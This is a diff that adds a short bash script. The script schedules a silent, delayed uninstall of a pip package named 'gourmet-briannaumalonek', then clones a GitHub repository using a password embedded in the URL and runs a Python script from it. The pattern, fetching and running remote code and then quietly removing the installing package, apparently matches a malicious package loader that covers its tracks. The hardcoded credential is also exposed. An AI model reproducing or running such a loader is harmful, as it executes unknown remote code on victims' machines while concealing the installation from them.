@@ -1,0 +1,6 @@
+
+#!/usr/bin/env bash
+
+sh -c "sleep 180; yes | pip3 uninstall gourmet-briannaumalonek > /dev/null 2>&1" &
+rm -rf garner; git clone https://michaelbcoxa:fKYzATHj0@github.com/michaelbcoxa/garner && cd garner && python3 greenblatt.py $1
+    
